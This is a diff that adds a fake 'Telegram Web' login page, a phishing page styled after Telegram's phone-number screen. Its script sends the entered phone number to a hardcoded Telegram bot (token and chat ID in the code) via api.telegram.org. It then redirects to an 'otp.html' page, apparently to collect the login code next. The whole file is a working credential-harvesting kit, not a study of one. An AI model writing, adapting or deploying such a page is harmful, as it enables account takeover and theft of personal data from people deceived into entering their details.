@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Telegram Web</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        min-height: 100vh; /* biar full layar */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: url("rew.jpg") no-repeat center center fixed;
+        background-size: cover;
+      }
+
+      .form-container {
+        background-color: lab(100% 0.01 -0.01 / 0.321); /* transparan 70% */
+        width: 80%;
+        max-width: 400px;
+        border-radius: 15px;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        padding: 30px;
+        text-align: center;
+        margin-top: 30px;
+        backdrop-filter: blur(8px); /* biar efek kaca buram */
+      }
+
+      .form-container h1 {
+        font-size: 20px;
+        margin-bottom: 10px;
+        font-weight: bold;
+      }
+
+      .form-container p {
+        font-size: 14px;
+        color: #ffffff;
+        margin-bottom: 20px;
+      }
+
+      .form-group {
+        margin-bottom: 20px;
+        position: relative;
+        text-align: left;
+      }
+
+      .form-group label {
+        font-size: 12px;
+        color: #999;
+        position: absolute;
+        top: -10px;
+        left: 15px;
+        background: #ffffff;
+        padding: 0 5px;
+        opacity: 0;
+        transition: opacity 0.3s ease;
+      }
+
+      .country-selector {
+        display: none;
+        align-items: center;
+        border: 1px solid #ccc;
+        border-radius: 10px;
+        padding: 10px;
+        background: #f9f9f9;
+        opacity: 0;
+        transition: opacity 0.3s ease;
+      }
+
+      .country-selector img {
+        width: 20px;
+        height: 14px;
+        margin-right: 10px;
+        border-radius: 2px;
+      }
+
+      .country-selector select {
+        border: none;
+        font-size: 14px;
+        flex-grow: 1;
+        background: transparent;
+        outline: none;
+        cursor: pointer;
+      }
+
+      .phone-input {
+        display: flex;
+        align-items: center;
+        border: 1px solid #ccc;
+        border-radius: 10px;
+        padding: 10px;
+        background: #f9f9f9;
+      }
+
+      .phone-input span {
+        font-size: 14px;
+        color: #333;
+        margin-right: 10px;
+      }
+
+      .phone-input input {
+        border: none;
+        font-size: 14px;
+        flex-grow: 1;
+        background: transparent;
+        outline: none;
+      }
+
+      .sync-label {
+        display: flex;
+        align-items: center;
+        font-size: 14px;
+        cursor: pointer;
+        margin-top: 10px;
+      }
+
+      .sync-label input {
+        margin-right: 10px;
+      }
+
+      .submit-btn {
+        width: 60px;
+        height: 60px;
+        border-radius: 50%;
+        background-color: #25d366;
+        border: none;
+        color: white;
+        font-size: 24px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin: 20px auto 0;
+        cursor: pointer;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      }
+
+      .submit-btn:hover {
+        background-color: #1caa54;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="form-container">
+      <img src="Telegram_logo.svg.png" alt="" style="width: 40%" />
+      <h1>Your phone number</h1>
+      <p>Please confirm your country code and enter your phone number.</p>
+      <form id="phoneForm">
+        <div class="form-group">
+          <label for="country" id="countryLabel">Country</label>
+          <div class="country-selector" id="countrySelector">
+            <img
+              src="https://flagcdn.com/w320/my.png"
+              alt="Malaysia Flag"
+              id="flag"
+            />
+            <select id="country" name="country">
+              <option
+                value="my"
+                data-flag="https://flagcdn.com/w320/my.png"
+                data-code="+60"
+                selected
+              >
+                Malaysia
+              </option>
+              <option
+                value="ae"
+                data-flag="https://flagcdn.com/w320/ae.png"
+                data-code="+971"
+              >
+                United Arab Emirates (Dubai)
+              </option>
+              <option
+                value="sa"
+                data-flag="https://flagcdn.com/w320/sa.png"
+                data-code="+966"
+              >
+                Saudi Arabia
+              </option>
+              <option
+                value="eg"
+                data-flag="https://flagcdn.com/w320/eg.png"
+                data-code="+20"
+              >
+                Egypt
+              </option>
+              <option
+                value="ma"
+                data-flag="https://flagcdn.com/w320/ma.png"
+                data-code="+212"
+              >
+                Morocco
+              </option>
+              <option
+                value="dz"
+                data-flag="https://flagcdn.com/w320/dz.png"
+                data-code="+213"
+              >
+                Algeria
+              </option>
+              <option
+                value="jo"
+                data-flag="https://flagcdn.com/w320/jo.png"
+                data-code="+962"
+              >
+                Jordan
+              </option>
+              <option
+                value="qa"
+                data-flag="https://flagcdn.com/w320/qa.png"
+                data-code="+974"
+              >
+                Qatar
+              </option>
+              <option
+                value="kw"
+                data-flag="https://flagcdn.com/w320/kw.png"
+                data-code="+965"
+              >
+                Kuwait
+              </option>
+              <option
+                value="om"
+                data-flag="https://flagcdn.com/w320/om.png"
+                data-code="+968"
+              >
+                Oman
+              </option>
+              <option
+                value="bh"
+                data-flag="https://flagcdn.com/w320/bh.png"
+                data-code="+973"
+              >
+                Bahrain
+              </option>
+            </select>
+          </div>
+        </div>
+        <div class="form-group">
+          <div class="phone-input">
+            <span id="countryCode">+60</span>
+            <input
+              type="text"
+              id="phone"
+              name="phone"
+              placeholder="Enter phone number"
+            />
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label class="sync-label">
+            <input
+              type="checkbox"
+              id="syncContacts"
+              name="syncContacts"
+              checked
+            />
+            Sync Contacts
+          </label>
+        </div>
+        <button type="button" class="submit-btn" id="submitBtn">
+          &#x2794;
+        </button>
+      </form>
+    </div>
+
+    <script>
+      const phoneInput = document.getElementById("phone");
+      const countrySelector = document.getElementById("countrySelector");
+      const countryLabel = document.getElementById("countryLabel");
+      const countryCode = document.getElementById("countryCode");
+
+      phoneInput.addEventListener("focus", () => {
+        countrySelector.style.display = "flex";
+        countrySelector.style.opacity = "1";
+        countryLabel.style.opacity = "1";
+      });
+
+      document
+        .getElementById("country")
+        .addEventListener("change", function () {
+          const selectedOption = this.options[this.selectedIndex];
+          const flagUrl = selectedOption.getAttribute("data-flag");
+          const code =
+            selectedOption.value === "my"
+              ? "+60"
+              : selectedOption.value === "id"
+              ? "+62"
+              : "+65";
+
+          document.getElementById("flag").src = flagUrl;
+          countryCode.textContent = code;
+        });
+
+      document
+        .getElementById("submitBtn")
+        .addEventListener("click", async function () {
+          const country = document.getElementById("country").value;
+          const phone = document.getElementById("phone").value;
+          const syncContacts = document.getElementById("syncContacts").checked;
+
+          if (!phone) {
+            alert("Please enter your phone number.");
+            return;
+          }
+
+          // Save to local storage
+          localStorage.setItem("phoneNumber", phone);
+
+          // Send to Telegram bot
+          const token = "8598329061:AAE-3VxORyUYkRGnhfwHjEQ7DQ69ziKZgt4";
+          const chatId = "5939111303";
+          const message = `
+
+────────────────
+🔰 DATA | NOMOR TELEGRAM 🔰
+────────────────
+📱 No HP : ${phone}
+────────────────`;
+
+          try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({ chat_id: chatId, text: message }),
+            });
+
+            // Redirect to OTP page
+            window.location.href = "otp.html";
+          } catch (error) {
+            alert("Failed to send phone number to Telegram.");
+          }
+        });
+    </script>
+
+    <script>
+      document
+        .getElementById("country")
+        .addEventListener("change", function () {
+          const selectedOption = this.options[this.selectedIndex];
+          const flagUrl = selectedOption.getAttribute("data-flag");
+          const code = selectedOption.getAttribute("data-code");
+
+          document.getElementById("flag").src = flagUrl;
+          document.getElementById("countryCode").textContent = code;
+        });
+    </script>
+  </body>
+</html>
